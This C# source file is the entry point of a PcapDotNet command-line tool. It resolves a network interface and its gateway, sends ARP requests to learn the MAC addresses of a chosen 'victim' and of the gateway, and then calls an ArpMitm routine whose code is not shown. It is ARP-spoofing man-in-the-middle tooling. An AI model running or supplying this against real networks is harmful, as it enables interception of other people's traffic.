using CommandLine;
using Leho.Functions;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using System;
using System.Linq;

namespace Leho
{
    class Program
    {
        static LivePacketDevice GetLivePacketDevice(string requestedNetworkInterface)
        {
            var livePacketDevices = LivePacketDevice.AllLocalMachine;
            var matchingLivePacketDevices = livePacketDevices
                .Where(networkInterface => networkInterface.Name == requestedNetworkInterface
                    || networkInterface.GetNetworkInterface().Name == requestedNetworkInterface)
                .ToArray();

            // This program cannot handle multiple network interfaces with the same name
            if (matchingLivePacketDevices.Length > 1)
            {
                throw new NotSupportedException($"Multiple interfaces matched '{requestedNetworkInterface}'.");
            }

            var matchingLivePacketDevice = matchingLivePacketDevices.SingleOrDefault();
            if (matchingLivePacketDevice == null)
            {
                throw new ArgumentException(
                    $"No interface matched '{requestedNetworkInterface}'." + Environment.NewLine
                  + "Found:" + Environment.NewLine
                  + string.Join(
                        Environment.NewLine,
                        livePacketDevices.Select(livePacketDevice =>
                            $"\t{livePacketDevice.Name} ({livePacketDevice.GetNetworkInterface().Name}).")
                    )
                );
            }

            return matchingLivePacketDevice;
        }

        static IpV4Address GetGatewayIpV4Address(LivePacketDevice livePacketDevice)
        {
            var gatewayIpAddresses = livePacketDevice.GetNetworkInterface().GetIPProperties().GatewayAddresses;
            if (gatewayIpAddresses.Count() > 1)
            {
                throw new NotSupportedException($"'{livePacketDevice.Name}' has multiple gateways.");
            }

            var gatewayIpAddress = gatewayIpAddresses.SingleOrDefault();
            if (gatewayIpAddress == null)
            {
                throw new ArgumentException($"'{livePacketDevice.Name}' does not have a gateway.");
            }

            if (gatewayIpAddress.Address.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork)
            {
                throw new NotSupportedException($"'{livePacketDevice.Name}' gateway does not have an IpV4 address.");
            }

            return new IpV4Address(gatewayIpAddress.Address.ToString());
        }

        static void Main(string[] args)
        {
            if (!BitConverter.IsLittleEndian)
            {
                throw new NotSupportedException("Big-endian systems are not supported.");
            }

            Parser.Default.ParseArguments<Options>(args).WithParsed(options =>
            {
                var livePacketDevice = GetLivePacketDevice(options.RequestedNetworkInterface);

                if (options.ArpMitmVictimIpV4 != null)
                {
                    var localMacAddress = livePacketDevice.GetMacAddress();

                    // TODO: what happens if the IpV4 address is invalid?
                    var victimIpV4Address = new IpV4Address(options.ArpMitmVictimIpV4);
                    var gatewayIpV4Address = GetGatewayIpV4Address(livePacketDevice);
                    var localIpV4SocketAddresses = livePacketDevice.Addresses.Where(address => address.Address != null);

                    if (localIpV4SocketAddresses.Count() > 1)
                    {
                        throw new NotSupportedException($"Found multiple IPv4 addresses for '{livePacketDevice.Name}'.");
                    }

                    var localIpV4SocketAddress = localIpV4SocketAddresses.SingleOrDefault()?.Address;
                    if (localIpV4SocketAddress == null || !(localIpV4SocketAddress is IpV4SocketAddress))
                    {
                        throw new NotSupportedException($"'{livePacketDevice.Name}' doesn't have an IPv4 address.");
                    }

                    var localIpV4Address = ((IpV4SocketAddress)localIpV4SocketAddress).Address;

                    using (var packetCommunicator = livePacketDevice.Open())
                    {
                        MacAddress? victimMacAddress = null;
                        new ArpRequest(victimIpV4Address, localMacAddress, localIpV4Address, macAddress =>
                        {
                            victimMacAddress = macAddress;
                        }).Execute(packetCommunicator);

                        MacAddress? gatewayMacAddress = null;
                        new ArpRequest(gatewayIpV4Address, localMacAddress, localIpV4Address, macAddress =>
                        {
                            gatewayMacAddress = macAddress;
                        }).Execute(packetCommunicator);

                        // TODO: what if it never gets one?
                        while (victimMacAddress == null) ;
                        while (gatewayMacAddress == null) ;

                        new ArpMitm(gatewayMacAddress.Value, gatewayIpV4Address, victimMacAddress.Value, victimIpV4Address, localMacAddress).Execute(packetCommunicator);
                    }
                }
            });
        }
    }
}
